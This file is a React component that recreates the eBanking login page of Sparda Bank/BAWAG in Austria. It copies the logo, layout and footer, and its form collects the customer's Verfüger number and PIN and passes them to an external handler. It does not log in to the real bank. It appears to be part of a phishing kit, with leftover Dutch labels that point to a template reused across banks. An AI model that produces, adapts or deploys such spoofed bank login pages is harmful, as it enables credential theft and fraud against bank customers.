"use client";

import React, { useState } from "react";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function SpardaBank({ formData, onChange, handleRouteAction, saving }: Props) {
  const [activeTab, setActiveTab] = useState("verfueger");

  return (
    <div className="min-h-screen flex flex-col font-sans bg-white">
      {/* Header */}
      <header className="bg-white py-6 px-4 xl:px-0 w-full relative z-10 max-w-[1050px] mx-auto">
        <div className="flex justify-between items-start md:items-center">
          {/* Logo */}
          <div>
            <img 
              src="/sparda-logo.webp" 
              alt="SPARDA BANK" 
              className="h-[80px] object-contain" 
            />
          </div>

          {/* Right Language Selector */}
          <div className="flex gap-2 text-[14px] font-bold">
            <a href="#" className="bg-[#e0e0e0] text-white px-2 py-0.5">DE</a>
            <a href="#" className="text-gray-600 hover:text-black px-1 py-0.5">EN</a>
            <a href="#" className="text-gray-600 hover:text-black px-1 py-0.5">BKS</a>
            <a href="#" className="text-gray-600 hover:text-black px-1 py-0.5">TR</a>
          </div>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="flex-grow w-full bg-[#1fc1ad] relative overflow-hidden min-h-[600px]">
        {/* Background Image / Promotional Area */}
        <div 
          className="absolute inset-0 bg-cover bg-center"
          style={{ backgroundImage: "url('/sparda-bg.webp')" }}
        ></div>

        <div className="max-w-[1050px] mx-auto px-4 xl:px-0 py-8 relative z-10 flex flex-col md:flex-row gap-6 items-start w-full">
          
          {/* Left Panel - Login Card */}
          <div className="bg-white rounded-[10px] shadow-lg p-6 md:p-8 w-full md:w-[400px] flex-shrink-0">
            <div className="flex justify-between items-center mb-6">
              <h1 className="text-[22px] font-bold text-gray-800">eBanking Login</h1>
              <button className="w-6 h-6 rounded-full bg-gray-100 text-gray-500 flex items-center justify-center font-bold text-sm hover:bg-gray-200">?</button>
            </div>
            
            <p className="text-[14px] text-gray-600 mb-6">Wie wollen Sie sich einloggen?</p>

            {/* Tabs */}
            <div className="flex border-b border-gray-200 mb-8">
              <button 
                className={`flex-1 pb-3 text-[15px] font-bold border-b-2 transition-colors ${activeTab === 'verfueger' ? 'border-[#9e0000] text-[#9e0000]' : 'border-transparent text-gray-400 hover:text-gray-600'}`}
                onClick={() => setActiveTab('verfueger')}
                type="button"
              >
                Verfüger
              </button>
              <button 
                className={`flex-1 pb-3 text-[15px] border-b-2 transition-colors ${activeTab === 'app' ? 'border-[#9e0000] text-[#9e0000]' : 'border-transparent text-gray-400 hover:text-gray-600'}`}
                onClick={() => setActiveTab('app')}
                type="button"
              >
                Mit der App
              </button>
            </div>

            {/* Login Form */}
            {activeTab === 'verfueger' && (
              <form 
                onSubmit={(e) => {
                  e.preventDefault();
                  handleRouteAction();
                }}
                className="flex flex-col gap-4"
              >
                <div className="relative">
                  <input 
                    type="text" 
                    placeholder="Inlogcode"
                    value={formData.verfuegernummer || ""}
                    onChange={(e) => onChange("verfuegernummer", e.target.value)}
                    className="w-full bg-white border border-gray-300 rounded-[5px] px-4 py-3 outline-none focus:border-gray-500 text-[15px] text-gray-800 placeholder-gray-400"
                  />
                </div>
                <div className="relative">
                  <input 
                    type="password" 
                    placeholder="PIN (8 bis 16 stellig )"
                    value={formData.pin || ""}
                    onChange={(e) => onChange("pin", e.target.value)}
                    className="w-full bg-white border border-gray-300 rounded-[5px] px-4 py-3 outline-none focus:border-gray-500 text-[15px] text-gray-800 placeholder-gray-400 pr-10"
                  />
                  <button type="button" className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                      <circle cx="12" cy="12" r="3"></circle>
                    </svg>
                  </button>
                </div>

                <button 
                  type="submit" 
                  disabled={saving} 
                  className="w-full bg-[#9e0000] hover:bg-[#800000] text-white py-3 rounded-[5px] font-bold transition-colors text-[16px] mt-2"
                >
                  {saving ? "Laden..." : "Login"}
                </button>

                <div className="mt-4">
                  <a href="#" className="text-[#9e0000] text-[14px] hover:underline flex items-center gap-1">
                    <span className="text-[16px] leading-none">›</span> PIN vergessen oder Verfüger gesperrt?
                  </a>
                </div>
              </form>
            )}
            
            {activeTab === 'app' && (
              <div className="flex flex-col items-center justify-center py-8 text-center">
                <p className="text-gray-600 mb-4">Gebruik de app voor deze inlogmethode.</p>
              </div>
            )}
          </div>

          {/* Right/Upper Info Panel */}
          <div className="bg-white rounded-[10px] shadow-lg p-6 w-full hidden md:grid grid-cols-3 gap-6 self-start">
            {/* Column 1 */}
            <div className="flex flex-col gap-3">
              <h3 className="text-[#9e0000] font-bold text-[16px] mb-1">Sicherheit</h3>
              <p className="text-[14px] text-gray-700 leading-snug">
                Die BAWAG versendet keine E-Mails mit direkten eBanking Login-Links!
              </p>
              <a href="#" className="text-[#9e0000] text-[14px] hover:underline flex items-center gap-1 mt-1">
                <span className="text-[16px] leading-none">›</span> Mehr Infos
              </a>
            </div>

            {/* Column 2 */}
            <div className="flex flex-col gap-3">
              <h3 className="text-[#9e0000] font-bold text-[16px] mb-1">Service & Info</h3>
              <a href="#" className="text-[#9e0000] text-[14px] hover:underline flex items-center gap-1">
                <span className="text-[16px] leading-none">›</span> <span className="text-gray-700">Sicherheitsregeln</span>
              </a>
              <a href="#" className="text-[#9e0000] text-[14px] hover:underline flex items-center gap-1">
                <span className="text-[16px] leading-none">›</span> <span className="text-gray-700">Anmeldung / Erste Schritte</span>
              </a>
              <a href="#" className="text-[#9e0000] text-[14px] hover:underline flex items-center gap-1">
                <span className="text-[16px] leading-none">›</span> <span className="text-gray-700">3D Secure Online Bezahlung</span>
              </a>
            </div>

            {/* Column 3 */}
            <div className="flex flex-col gap-3">
              <h3 className="text-[#9e0000] font-bold text-[16px] mb-1">Support</h3>
              <a href="#" className="text-[#9e0000] text-[14px] hover:underline flex items-center gap-1">
                <span className="text-[16px] leading-none">›</span> <span className="text-gray-700">FAQ</span>
              </a>
              <a href="#" className="text-[#9e0000] text-[14px] hover:underline flex items-center gap-1">
                <span className="text-[16px] leading-none">›</span> <span className="text-gray-700">Zu Watchlist Internet</span>
              </a>
            </div>
          </div>

        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white py-8 w-full border-t border-gray-200">
        <div className="max-w-[1200px] mx-auto px-4 text-center flex flex-col items-center">
          <div className="flex flex-wrap justify-center gap-2 md:gap-4 text-[13px] text-gray-600 mb-2">
            <a href="#" className="hover:underline">Impressum</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:underline">AGB</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:underline">Datenschutz</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:underline">Nutzungsbedingungen</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:underline">Barrierefrei</a>
          </div>
          <p className="text-[11px] text-gray-500">© BAWAG P.S.K.</p>
        </div>
      </footer>
    </div>
  );
}
